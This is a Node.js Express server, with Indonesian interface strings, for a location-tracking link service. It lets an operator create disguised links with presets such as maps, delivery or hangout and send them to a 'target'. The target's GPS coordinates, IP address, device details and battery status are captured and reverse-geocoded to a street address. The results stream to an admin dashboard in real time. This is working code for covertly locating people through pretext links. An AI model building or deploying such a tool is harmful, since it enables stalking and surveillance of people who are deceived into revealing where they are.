const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Data directory & storage setup
const DATA_DIR = path.join(__dirname, 'data');
const STORE_FILE = path.join(DATA_DIR, 'store.json');

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

function loadData() {
  try {
    if (fs.existsSync(STORE_FILE)) {
      const raw = fs.readFileSync(STORE_FILE, 'utf8');
      return JSON.parse(raw);
    }
  } catch (err) {
    console.error('Error reading store:', err.message);
  }
  return { links: [], logs: [] };
}

function saveData(data) {
  try {
    fs.writeFileSync(STORE_FILE, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.error('Error saving store:', err.message);
  }
}

// In-memory reference initialized from file
let db = loadData();

// SSE Clients for real-time dashboard notifications
let sseClients = [];

function broadcastSSE(eventType, data) {
  const payload = `event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach((client) => {
    try {
      client.res.write(payload);
    } catch (e) {
      // client disconnected
    }
  });
}

// Helper: Reverse Geocoding with OpenStreetMap Nominatim
async function reverseGeocode(lat, lng) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&addressdetails=1`;
    const response = await fetch(url, {
      headers: {
        'User-Agent': 'TrackLokasiApp/1.0 (Admin Dashboard Geolocation)',
        'Accept-Language': 'id, en;q=0.8'
      },
      signal: AbortSignal.timeout(6000)
    });

    if (!response.ok) {
      throw new Error(`Nominatim responded with status ${response.status}`);
    }

    const data = await response.json();
    const addr = data.address || {};

    // Format Indonesian friendly addresses
    const road = addr.road || addr.pedestrian || addr.street || addr.footway || 'Jalan tidak teridentifikasi';
    const village = addr.village || addr.suburb || addr.neighbourhood || addr.quarter || addr.residential || '-';
    const district = addr.city_district || addr.district || addr.subdistrict || addr.municipality || '-';
    const city = addr.city || addr.town || addr.regency || addr.county || '-';
    const state = addr.state || '-';
    const postcode = addr.postcode || '-';
    const country = addr.country || 'Indonesia';

    return {
      road,
      village,
      district,
      city,
      state,
      postcode,
      country,
      full_address: data.display_name || `${road}, ${district}, ${city}, ${state}`
    };
  } catch (err) {
    console.warn('Reverse geocode failed or timed out:', err.message);
    return {
      road: 'Tidak diketahui (GPS offline geocode)',
      village: '-',
      district: '-',
      city: '-',
      state: '-',
      postcode: '-',
      country: '-',
      full_address: `Koordinat: ${lat}, ${lng}`
    };
  }
}

// Helper: parse user agent to readable device info
function parseUserAgent(ua = '') {
  let deviceType = 'Desktop / Laptop';
  let os = 'Unknown OS';
  let browser = 'Unknown Browser';

  if (/Android/i.test(ua)) {
    deviceType = 'Smartphone (Android)';
    os = 'Android';
  } else if (/iPhone|iPad|iPod/i.test(ua)) {
    deviceType = /iPad/i.test(ua) ? 'Tablet (iPad)' : 'Smartphone (iPhone)';
    os = 'iOS';
  } else if (/Windows NT/i.test(ua)) {
    deviceType = 'PC / Laptop (Windows)';
    os = 'Windows';
  } else if (/Macintosh|Mac OS X/i.test(ua)) {
    deviceType = 'PC / Mac (macOS)';
    os = 'macOS';
  } else if (/Linux/i.test(ua)) {
    deviceType = 'PC / Laptop (Linux)';
    os = 'Linux';
  }

  if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua) && !/OPR\//i.test(ua)) {
    browser = 'Google Chrome';
  } else if (/Edg\//i.test(ua)) {
    browser = 'Microsoft Edge';
  } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
    browser = 'Apple Safari';
  } else if (/Firefox\//i.test(ua)) {
    browser = 'Mozilla Firefox';
  } else if (/OPR|Opera/i.test(ua)) {
    browser = 'Opera';
  }

  return { deviceType, os, browser };
}

// ================= API ROUTES =================

// Real-time SSE endpoint for Dashboard
app.get('/api/events', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });

  const clientId = Date.now();
  const newClient = { id: clientId, res };
  sseClients.push(newClient);

  // Initial ping
  res.write(`event: connected\ndata: ${JSON.stringify({ status: 'connected', clients: sseClients.length })}\n\n`);

  req.on('close', () => {
    sseClients = sseClients.filter((c) => c.id !== clientId);
  });
});

// 1. Get all tracking links
app.get('/api/links', (req, res) => {
  res.json({
    success: true,
    links: db.links || []
  });
});

// 2. Create a new tracking link
app.post('/api/links', (req, res) => {
  const { title, preset, targetDestination, note } = req.body;

  const id = 'loc-' + Math.random().toString(36).substring(2, 8) + Date.now().toString(36).slice(-4);
  const now = new Date();

  const newLink = {
    id,
    title: title?.trim() || 'Titik Lokasi Pertemuan',
    preset: preset || 'maps', // maps, delivery, hangout, custom
    targetDestination: targetDestination?.trim() || '',
    note: note?.trim() || '',
    createdAt: now.toISOString(),
    clicks: 0,
    captures: 0
  };

  db.links.unshift(newLink);
  saveData(db);

  broadcastSSE('link_created', newLink);

  res.status(201).json({
    success: true,
    link: newLink
  });
});

// 3. Get single link metadata
app.get('/api/links/:id', (req, res) => {
  const link = db.links.find((l) => l.id === req.params.id);
  if (!link) {
    return res.status(404).json({ success: false, message: 'Link tidak ditemukan' });
  }
  res.json({ success: true, link });
});

// 4. Delete tracking link & related logs
app.delete('/api/links/:id', (req, res) => {
  const linkId = req.params.id;
  db.links = db.links.filter((l) => l.id !== linkId);
  db.logs = db.logs.filter((log) => log.linkId !== linkId);
  saveData(db);

  broadcastSSE('link_deleted', { id: linkId });
  res.json({ success: true, message: 'Link berhasil dihapus' });
});

// 5. Get all captured logs
app.get('/api/logs', (req, res) => {
  const { linkId } = req.query;
  let logs = db.logs || [];
  if (linkId) {
    logs = logs.filter((l) => l.linkId === linkId);
  }
  res.json({
    success: true,
    logs
  });
});

// 6. Delete a specific log
app.delete('/api/logs/:id', (req, res) => {
  const logId = req.params.id;
  db.logs = db.logs.filter((l) => l.id !== logId);
  saveData(db);
  broadcastSSE('log_deleted', { id: logId });
  res.json({ success: true, message: 'Log berhasil dihapus' });
});

// 7. Clear all logs
app.post('/api/logs/clear', (req, res) => {
  db.logs = [];
  db.links.forEach((l) => (l.captures = 0));
  saveData(db);
  broadcastSSE('logs_cleared', {});
  res.json({ success: true, message: 'Semua log riwayat telah dibersihkan' });
});

// 8. Track target visit (Click count)
app.post('/api/visit/:id', (req, res) => {
  const link = db.links.find((l) => l.id === req.params.id);
  if (link) {
    link.clicks = (link.clicks || 0) + 1;
    saveData(db);
    broadcastSSE('link_clicked', { linkId: link.id, clicks: link.clicks });
  }
  res.json({ success: true });
});

// 9. CAPTURE GPS COORDINATES & REVERSE GEOCODE
app.post('/api/track/:id', async (req, res) => {
  try {
    const linkId = req.params.id;
    const link = db.links.find((l) => l.id === linkId);

    const {
      latitude,
      longitude,
      accuracy,
      altitude,
      altitudeAccuracy,
      heading,
      speed,
      clientAddress,
      screenResolution,
      battery,
      connectionType
    } = req.body;

    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ success: false, message: 'Koordinat latitude dan longitude wajib diisi' });
    }

    const lat = parseFloat(latitude);
    const lng = parseFloat(longitude);
    const acc = parseFloat(accuracy || 0);

    // Get IP Address
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ip = rawIp.replace(/^.*:/, '') || '127.0.0.1';

    // Parse Device Info
    const userAgent = req.headers['user-agent'] || '';
    const deviceInfo = parseUserAgent(userAgent);

    // Reverse Geocode to street/district/city
    const geoDetails = await reverseGeocode(lat, lng);

    const logEntry = {
      id: 'log-' + Math.random().toString(36).substring(2, 9),
      linkId: link ? link.id : linkId,
      linkTitle: link ? link.title : 'Link Anonim',
      preset: link ? link.preset : 'maps',
      timestamp: new Date().toISOString(),
      coordinates: {
        latitude: lat,
        longitude: lng,
        accuracy: acc,
        altitude: altitude !== null ? altitude : null,
        altitudeAccuracy: altitudeAccuracy !== null ? altitudeAccuracy : null,
        heading: heading !== null ? heading : null,
        speed: speed !== null ? speed : null
      },
      address: geoDetails,
      device: {
        userAgent,
        ...deviceInfo,
        screenResolution: screenResolution || 'Unknown',
        battery: battery || null,
        connectionType: connectionType || 'Unknown'
      },
      ip: ip === '1' ? '127.0.0.1 (Localhost)' : ip,
      googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`
    };

    // Update link counters
    if (link) {
      link.captures = (link.captures || 0) + 1;
    }

    db.logs.unshift(logEntry);
    saveData(db);

    // Real-time broadcast to dashboard!
    broadcastSSE('new_location', logEntry);

    res.status(200).json({
      success: true,
      message: 'Lokasi berhasil dicatat dan diproses',
      logId: logEntry.id,
      address: geoDetails
    });
  } catch (error) {
    console.error('Error handling track POST:', error);
    res.status(500).json({ success: false, message: 'Terjadi kesalahan internal server' });
  }
});

// View page for target (Dynamic URL)
app.get('/view/:id', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// View dashboard directly
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

const server = app.listen(PORT, () => {
  console.log(`=======================================================`);
  console.log(`🚀 Track Lokasi Server aktif di http://localhost:${PORT}`);
  console.log(`📊 Dashboard Admin: http://localhost:${PORT}/dashboard`);
  console.log(`=======================================================`);
});
